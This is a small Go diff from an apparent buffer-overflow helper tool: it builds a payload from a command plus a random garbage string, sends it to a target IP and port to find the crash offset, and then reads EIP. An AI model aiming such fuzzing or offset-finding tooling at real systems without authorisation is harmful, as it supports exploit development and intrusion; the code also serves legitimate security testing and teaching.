@@ -42,7 +42,13 @@ to quickly create a Cobra application.`,
 		fmt.Println("Finding the offset")
 		fmt.Println("Generating garbage string of length: ", l)
 		randStr := gorand.RandStr(l)
-		if err := webfuzz.FuzzContent(ip, port, command, randStr, poolSize); err != nil {
+		payload := append([]byte(command), []byte(randStr)[:]...)
+		if err := webfuzz.SendPayload(
+			ip,
+			port,
+			payload,
+			poolSize,
+		); err != nil {
 			fmt.Println("Unable to fuzz: ", err)
 		}
 		var eip string
